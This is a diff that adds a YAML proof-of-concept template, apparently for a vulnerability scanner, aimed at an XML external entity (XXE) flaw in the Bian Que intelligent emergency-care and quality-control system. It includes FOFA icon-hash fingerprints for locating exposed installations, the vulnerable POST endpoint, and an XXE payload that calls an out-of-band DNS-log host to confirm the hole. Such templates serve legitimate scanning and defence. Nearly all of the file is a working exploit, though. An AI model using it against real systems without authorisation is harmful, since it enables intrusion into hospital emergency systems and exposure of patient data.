@@ -1,0 +1,22 @@
+id: poc-yaml-bian-que-ivtbq-ieqcs-yzgh-xxe
+info:
+  name: 扁鹊飞救智能急救与质控系统 YZGH XML实体注入漏洞
+  severity: high
+  tags:
+  - DNSLOG
+  - xxe
+  finger: 扁鹊飞救智能急救与质控系统
+  fofa: icon_hash="-757866684" || icon_hash="-1206146847"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: POST
+  path: /AppService/BQMedical/WebServiceForFirstaidApp.asmx/YZGH
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: 'requestXml=<?xml version="1.0" encoding="UTF-8"?>
+
+    <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{{.domain}}"> %remote;]>'
+  expression: status_code == 500 && contains(body,"远程服务器") && reverse.Verify()
+transport: http
